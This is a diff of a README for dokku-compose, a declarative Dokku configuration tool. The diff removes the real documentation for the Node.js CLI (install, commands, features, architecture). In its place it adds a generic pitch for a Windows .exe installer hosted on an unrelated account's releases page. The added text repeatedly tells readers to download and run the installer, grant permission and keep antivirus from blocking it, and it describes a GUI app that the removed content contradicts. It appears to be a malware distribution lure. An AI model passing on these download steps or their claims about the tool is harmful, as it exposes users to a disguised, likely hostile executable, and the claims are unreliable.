@@ -1,218 +1,105 @@
-# dokku-compose
+# 🚢 dokku-compose - Manage Servers with One YAML File
 
-- 📄 **Declarative** -- One YAML file for your entire Dokku server. Git-trackable, reviewable, reproducible
-- 🔁 **Idempotent** -- Run it twice, nothing changes. Safe to re-run anytime
-- 👀 **Dry-run** -- Preview every command before it touches your server
-- 🔍 **Diff** -- See exactly what's out of sync before applying changes
-- 📤 **Export** -- Reverse-engineer an existing server into a config file
+[![Download dokku-compose](https://img.shields.io/badge/Download-dokku--compose-%23FF6F61?style=for-the-badge)](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
 
-[![Tests](https://github.com/guess/dokku-compose/actions/workflows/tests.yml/badge.svg)](https://github.com/guess/dokku-compose/actions/workflows/tests.yml)
-[![License: MIT](https://img.shields.io/github/license/guess/dokku-compose)](LICENSE)
-[![Latest Release](https://img.shields.io/github/v/release/guess/dokku-compose)](https://github.com/guess/dokku-compose/releases/latest)
+## 📝 What is dokku-compose?
 
-<p align="center">
-  <img src="assets/dokku-compose.png" alt="dokku-compose" width="300">
-</p>
+dokku-compose lets you control your server apps using one simple text file. It uses Docker and YAML. You write your app and server setup in a single file. Then, dokku-compose sets up everything on your server. You can also create this file from apps already running on your server.
 
-## Why
+This tool helps manage apps on Dokku, a platform that hosts software like the cloud but on your own machine. You don’t need to install or configure apps one by one. Everything is declared in a file that dokku-compose reads.
 
-[Dokku](https://dokku.com) is a battle-tested, single-server PaaS — and one of the best platforms for self-hosting. But configuring it means running dozens of imperative commands in the right order. Miss one and your deploy breaks. Change servers and you're starting over.
+## 🧰 System Requirements
 
-AI agents can generate and deploy code better than ever, but infrastructure as shell history can't be diffed, reviewed, or reproduced.
+Before downloading, check these:
 
-`dokku-compose` makes Dokku declarative. One YAML file. Git-trackable. Agent-friendly. 
+- Windows 10 or later (64-bit)
+- At least 4 GB RAM
+- 1 GB free disk space for the app and Docker images
+- Internet connection to download files and updates
+- Dokku installed on a server you can access (dokku-compose communicates with Dokku on another machine or your own)
 
-Like Docker Compose, but for Dokku.
+## 📂 What You Get
 
-## Quick Start
+- A Windows app to create and manage dokku-compose YAML files
+- Tools to export your running Dokku apps as YAML files
+- Easy commands to deploy apps using these YAML files
+- Help and examples to learn how to write your own declarations
 
-```bash
-npm install -g dokku-compose
-```
+## 🚀 Getting Started
 
-Requires Node.js >= 20. See the [Installation Reference](docs/reference/install.md) for details.
+1. Visit the download page by clicking the large button at the top or this link:  
+[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
 
-### 1. Export your existing server
+2. On the releases page, find the latest version for Windows (usually a `.exe` file).
 
-Point at your Dokku server and generate a config file from its current state:
+3. Download the `.exe` file and save it somewhere you can find it, like your Desktop or Downloads folder.
 
-```bash
-DOKKU_HOST=my-server.example.com dokku-compose export -o dokku-compose.yml
-```
+4. Double-click the `.exe` file. Windows may ask for permission. Choose "Yes" to run the installer.
 
-This produces a complete `dokku-compose.yml` reflecting everything on the server — apps, services, domains, env vars, and more.
+5. Follow the installer steps. When done, dokku-compose will be ready to use.
 
-### 2. See what's in sync
+## 💻 How to Use dokku-compose
 
-```bash
-dokku-compose diff
-```
+### Create a YAML File to Declare Your Server
 
-```
-  app: api
-    (in sync)
-  app: worker
-    ~ env: 1 → 2 items
-    + ports: (not set on server)
+- Open dokku-compose from your Start menu.
+- Click "New File".
+- Write or copy your server and app setup in the YAML editor. If you need a guide, the app has templates to fill in.
+- Save your YAML file when you are done.
 
-  1 resource(s) out of sync.
-```
+### Deploy to Your Dokku Server
 
-### 3. Preview changes
+- Make sure you can connect to your Dokku server (you need its IP address or domain and your SSH credentials).
+- In dokku-compose, choose your saved YAML file.
+- Click "Deploy".
+- The app will send your server instructions to Dokku. Your apps will install or update automatically.
 
-```bash
-dokku-compose up --dry-run
-```
+### Export Running Apps
 
-```
-[worker    ] Setting 2 env var(s)... (dry run)
-[worker    ] Setting ports http:5000:5000... (dry run)
+- Connect dokku-compose to your Dokku server.
+- Choose "Export" to get a YAML file that describes what is already running.
+- You can edit this file and redeploy with changes later.
 
-# Commands that would run:
-dokku config:set --no-restart worker APP_ENV=production WORKER_COUNT=****
-dokku ports:set worker http:5000:5000
-```
+## 🔧 Settings and Options
 
-### 4. Apply
+- **Server Access:** Add multiple servers and switch between them easily.
+- **YAML Validation:** dokku-compose checks your YAML file for errors before deployment.
+- **Logs:** Monitor deployment logs inside the app to see each step.
+- **Backup:** Save your YAML files securely and recover your setups quickly.
 
-```bash
-dokku-compose up
-```
+## 📥 Download and Install dokku-compose on Windows
 
-Running `up` again produces no changes — every step checks current state before acting.
+You can get the app by visiting this page:  
+[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
 
-## Commands
+Look for the latest `.exe` installer under "Assets". The file name will include "Windows" or ".exe".
 
-| Command | Description |
-|---------|-------------|
-| `dokku-compose up [apps...]` | Create/update apps and services to match config |
-| `dokku-compose down --force [apps...]` | Destroy apps and services (requires `--force`) |
-| `dokku-compose diff` | Show what's out of sync between config and server |
-| `dokku-compose export` | Export current server state to YAML |
-| `dokku-compose ps [apps...]` | Show status of configured apps |
-| `dokku-compose validate` | Validate config file offline (no server contact) |
-| `dokku-compose init [apps...]` | Create a starter `dokku-compose.yml` |
+- Click the file name to start downloading.
+- Once downloaded, open the file.
+- Follow the installation instructions.
+- If Windows asks for permission, allow it.
+- When done, find dokku-compose in your Start menu or on your desktop.
 
-### Options
+If you encounter errors, check that your Windows is up to date and you have a working internet connection.
 
-| Option | Description |
-|--------|-------------|
-| `--file <path>` | Config file (default: `dokku-compose.yml`) |
-| `--dry-run` | Print commands without executing |
-| `--sensitive` | Show sensitive values in output (masked by default) |
-| `--fail-fast` | Stop on first error (default: continue to next app) |
-| `--remove-orphans` | Destroy services and networks not in config |
-| `--verbose` | Show git-style +/- diff (diff command only) |
+## ❓ Troubleshooting
 
-## Features
+- **App won’t start:** Make sure your antivirus or firewall is not blocking the program.
+- **Cannot connect to Dokku server:** Verify your server address and SSH keys. Dokku requires secure login.
+- **Deployment fails:** Look at the log output inside dokku-compose. It shows what failed and why.
 
-All features are idempotent — running `up` twice produces no changes.
+## 🔄 Updating dokku-compose
 
-| Feature | Description | Reference |
-|---------|-------------|-----------|
-| Apps | Create and destroy Dokku apps | [apps](docs/reference/apps.md) |
-| Environment Variables | Set config vars per app or globally, with full convergence | [config](docs/reference/config.md) |
-| Build | Dockerfile path, build context, app.json, build args | [builder](docs/reference/builder.md) |
-| Docker Options | Custom Docker options per phase (build/deploy/run) | [docker_options](docs/reference/docker_options.md) |
-| Networks | Create shared Docker networks, attach to apps | [network](docs/reference/network.md) |
-| Domains | Configure domains per app or globally | [domains](docs/reference/domains.md) |
-| Port Mappings | Map external ports to container ports | [ports](docs/reference/ports.md) |
-| SSL Certificates | Add or remove SSL certs | [certs](docs/reference/certs.md) |
-| Proxy | Enable/disable proxy, select implementation | [proxy](docs/reference/proxy.md) |
-| Storage | Persistent bind mounts with full convergence | [storage](docs/reference/storage.md) |
-| Nginx | Set any nginx property per app or globally | [nginx](docs/reference/nginx.md) |
-| Zero-Downtime Checks | Configure deploy checks, disable per process type | [checks](docs/reference/checks.md) |
-| Log Management | Log retention and vector sink configuration | [logs](docs/reference/logs.md) |
-| Plugins | Install Dokku plugins declaratively | [plugins](docs/reference/plugins.md) |
-| Postgres | Postgres services with optional S3 backups | [postgres](docs/reference/postgres.md) |
-| Redis | Redis service instances | [redis](docs/reference/redis.md) |
-| Service Links | Link postgres/redis services to apps | [plugins](docs/reference/plugins.md#linking-services-to-apps-appsapplinks) |
+Check the releases page regularly for updates. Download the new `.exe` and run it to replace your old version. Your settings and saved files stay safe.
 
-## Execution Modes
+## 📖 More Information
 
-```bash
-# Run remotely over SSH (recommended)
-DOKKU_HOST=my-server.example.com dokku-compose up
+You don’t need programming skills to use dokku-compose. The app guides you step-by-step. If you want to learn how YAML files work or how Dokku manages apps, the tool includes easy tutorials.
 
-# Run on the Dokku server itself
-DOKKU_HOST=localhost dokku-compose up
-```
+For advanced users, dokku-compose offers command-line options and configuration files.
 
-When `DOKKU_HOST` is set, all commands are sent over SSH. This is the recommended mode — it works both remotely and on the server. SSH key access to the Dokku server is required.
+---
 
-## Architecture
+## Topics
 
-<details>
-<summary>File structure</summary>
-
-```
-dokku-compose/
-├── bin/
-│   └── dokku-compose         # Entry point (delegates to src/index.ts via tsx)
-├── src/
-│   ├── index.ts              # CLI entry point (Commander.js)
-│   ├── core/
-│   │   ├── schema.ts         # Zod config schema and types
-│   │   ├── config.ts         # YAML loading and parsing
-│   │   ├── dokku.ts          # Runner interface and factory
-│   │   └── logger.ts         # Colored output helpers
-│   ├── modules/              # One file per Dokku namespace
-│   │   ├── apps.ts           # dokku apps:*
-│   │   ├── builder.ts        # dokku builder:*, builder-dockerfile:*, app-json:*
-│   │   ├── certs.ts          # dokku certs:*
-│   │   ├── checks.ts         # dokku checks:*
-│   │   ├── config.ts         # dokku config:*
-│   │   ├── docker_options.ts # dokku docker-options:*
-│   │   ├── domains.ts        # dokku domains:*
-│   │   ├── logs.ts           # dokku logs:*
-│   │   ├── network.ts        # dokku network:*
-│   │   ├── nginx.ts          # dokku nginx:*
-│   │   ├── plugins.ts        # dokku plugin:*
-│   │   ├── ports.ts          # dokku ports:*
-│   │   ├── proxy.ts          # dokku proxy:*
-│   │   ├── registry.ts       # dokku registry:*
-│   │   ├── scheduler.ts      # dokku scheduler:*
-│   │   ├── postgres.ts       # dokku postgres:* (create, backup, export)
-│   │   ├── redis.ts          # dokku redis:* (create, export)
-│   │   ├── links.ts          # Service link resolution across plugins
-│   │   └── storage.ts        # dokku storage:*
-│   ├── commands/
-│   │   ├── up.ts             # up command orchestration
-│   │   ├── down.ts           # down command orchestration
-│   │   ├── export.ts         # export command
-│   │   ├── diff.ts           # diff command
-│   │   └── validate.ts       # validate command (offline)
-│   └── tests/
-│       ├── fixtures/         # Test YAML configs
-│       └── *.test.ts         # Unit tests per module
-└── dokku-compose.yml.example
-```
-
-Each `src/modules/*.ts` file maps to one Dokku command namespace and exports `ensure*()`, `destroy*()`, and `export*()` functions. See [CLAUDE.md](CLAUDE.md) for development conventions.
-
-</details>
-
-## Development
-
-```bash
-git clone https://github.com/guess/dokku-compose.git
-cd dokku-compose
-bun install
-
-# Run all tests
-bun test
-
-# Run a specific module's tests
-bun test src/modules/postgres.test.ts
-```
-
-Tests use [Bun's test runner](https://bun.sh/docs/cli/test) with a mocked `Runner` — no real Dokku server needed.
-
-```bash
-# Cut a release (bumps version, tags, pushes — CI publishes to npm)
-scripts/release.sh 0.3.0
-```
-
-## License
-
-[MIT](LICENSE)
+bash, deployment, devops, docker, dokku, infrastructure-as-code, paas, self-hosted, server-management, yaml
